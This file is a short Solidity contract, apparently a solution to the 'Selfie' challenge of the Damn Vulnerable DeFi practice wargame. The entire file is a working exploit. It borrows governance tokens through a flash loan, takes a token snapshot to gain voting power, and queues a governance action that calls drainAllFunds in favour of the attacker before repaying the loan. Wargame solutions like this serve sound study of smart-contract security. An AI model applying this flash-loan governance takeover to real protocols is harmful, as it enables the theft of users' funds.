// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttacker{
    
    SelfiePool selfiepool;
    SimpleGovernance goverance;
    address attacker;
    event ActionId(uint256 ActionId);
    constructor(SelfiePool pool,SimpleGovernance simplegover){
        selfiepool = pool;
        goverance = simplegover;
        attacker = msg.sender;
    }
    
    function attack(uint256 borrowamount) public payable{
        selfiepool.flashLoan(borrowamount);
    }
    
    function receiveTokens(address token,uint256 borrowamount) external payable returns(uint256){
    
    DamnValuableTokenSnapshot(token).snapshot();
    bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", address(attacker));
    uint actionId = goverance.queueAction(address(selfiepool) ,data , 0);
    emit ActionId(actionId);
    DamnValuableTokenSnapshot(token).transfer(address(selfiepool),borrowamount);
    return actionId;
    }

}